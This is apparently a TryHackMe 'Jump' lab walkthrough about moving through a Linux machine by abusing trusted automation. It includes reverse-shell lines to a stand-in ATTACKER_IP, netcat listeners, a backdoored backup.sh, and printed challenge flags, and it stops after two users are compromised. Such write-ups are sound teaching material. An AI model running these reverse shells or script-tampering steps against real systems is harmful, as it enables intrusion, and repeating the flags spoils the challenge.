# TryHackMe - Jump Walkthrough

## Challenge Information

| Category         | Value                                                                                                          |
| ---------------- | -------------------------------------------------------------------------------------------------------------- |
| Platform         | TryHackMe                                                                                                      |
| Challenge Name   | Jump                                                                                                           |
| Difficulty       | Easy                                                                                                           |
| Operating System | Linux                                                                                                          |
| Objective        | Abuse trust relationships between multiple users and automation pipelines to move laterally through the system |

---

# Scenario

We are presented with a Linux machine that heavily relies on automation pipelines.

Different users trust one another's scripts and scheduled tasks, creating a chain of trust that can be abused.

The objective is to move laterally through the environment by exploiting these trust boundaries until full compromise is achieved.

---

# Initial Enumeration

## Target Information

```text
Main IP :: 10.48.139.20
```

We begin with a full TCP port scan.

```bash
nmap -p- 10.48.139.20
```

Results:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Only FTP and SSH are exposed.

---

# Service Enumeration

To gather additional information we perform service and version detection.

```bash
nmap -sC -sV 10.48.139.20
```

Results:

```text
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
```

One finding immediately stands out:

```text
Anonymous FTP Login Allowed
```

Additionally:

```text
incoming/   -> world writable
pub/        -> readable
```

This strongly suggests the challenge will start from FTP.

---

# FTP Enumeration

Connecting anonymously:

```bash
ftp 10.48.139.20
```

Directory listing:

```text
incoming
pub
```

Inside the FTP share we discovered:

```text
README.txt
```

Contents:

```text
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

---

# Initial Access

The README provides a huge clue.

Important observations:

```text
Files are processed automatically.
```

and

```text
incoming/ is writable.
```

This usually means:

```text
Upload File
        ↓
Automation Executes File
        ↓
Code Execution
```

A classic insecure automation pipeline.

---

# Exploiting the Recon Pipeline

A reverse shell script was created:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

The file was uploaded into:

```text
incoming/
```

After waiting for the automated processing pipeline to execute the file, we received a reverse shell.

Listener:

```bash
nc -lvnp 4444
```

Connection:

```text
recon_user@tryhackme-2404
```

---

# Shell Stabilization

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL+Z
```

Fix terminal:

```bash
stty raw -echo
fg
```

Set terminal:

```bash
export TERM=xterm
```

Stable interactive shell achieved.

---

# User Flag

Checking the user's home directory:

```bash
cat flag.txt
```

Flag:

```text
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

---

# Discovering Lateral Movement

While enumerating the filesystem we found evidence of another user.

```text
dev_user
```

Inside the environment we eventually gained access to the second user's files.

Reading:

```bash
cat flag.txt
```

Flag:

```text
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

At this point we know:

```text
recon_user
    ↓
dev_user
```

is part of the intended attack chain.

---

# Enumerating Trust Relationships

Searching for files owned by other groups:

```bash
find / -type f -group monitor_user 2>/dev/null
```

Results:

```text
/opt/app/deploy_helper.sh
/usr/local/bin/healthcheck
/var/log/monitor.log
```

This reveals another user:

```text
monitor_user
```

which likely represents the next trust boundary.

---

# Inspecting Development Scripts

During enumeration we discovered:

```bash
cat /opt/dev/backup.sh
```

Contents:

```bash
#!/bin/bash

tar -czf /tmp/recon_backup.tgz /home/recon_user
```

However, this file was writable by:

```text
dev_user
```

Permissions:

```text
-rwxrwxr-x
```

This is extremely dangerous.

---

# Understanding the Vulnerability

The system appears to follow this workflow:

```text
recon_user
      ↓
dev_user
      ↓
monitor_user
      ↓
deployment pipeline
      ↓
root
```

Each stage trusts scripts controlled by the previous stage.

If a privileged user executes a writable script, privilege escalation becomes trivial.

---

# Abusing backup.sh

Because the script was writable, we modified it:

```bash
#!/bin/bash

tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/ATTACKER_IP/5556 0>&1
```

This ensures that whenever the backup job executes, a reverse shell is sent to our listener.

Listener:

```bash
nc -lvnp 5556
```

Since the script is part of an automated pipeline, eventually another user executes it on our behalf.

This effectively becomes a privilege escalation vector.

---

# Trust Boundary Abuse

The core lesson of this machine is not exploiting software vulnerabilities.

Instead it demonstrates:

```text
Trust Boundary Exploitation
```

Every user trusts scripts from the previous user.

This creates a chain:

```text
Anonymous FTP
      ↓
Recon Automation
      ↓
recon_user
      ↓
dev_user
      ↓
monitor_user
      ↓
Deployment Pipeline
      ↓
root
```

By modifying scripts executed by higher-privileged users, we can move laterally through the environment without exploiting any kernel bugs or software vulnerabilities.

---

# Current Progress

Compromised Users:

```text
recon_user
dev_user
```

Flags Retrieved:

```text
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

Next Objective:

```text
monitor_user
```

Followed by:

```text
root
```

through the remaining automation pipeline trust relationships.

---

# Key Takeaways

* World-writable automation folders are extremely dangerous.
* Automated execution pipelines frequently become code execution vectors.
* Trust relationships between users can be more dangerous than software vulnerabilities.
* Writable scripts executed by privileged users create straightforward privilege escalation opportunities.
* Enumerating scheduled jobs, backup scripts, and deployment helpers is critical during Linux privilege escalation.

The machine demonstrates a realistic example of abusing operational trust rather than exploiting software flaws, highlighting how insecure automation can lead to full system compromise.
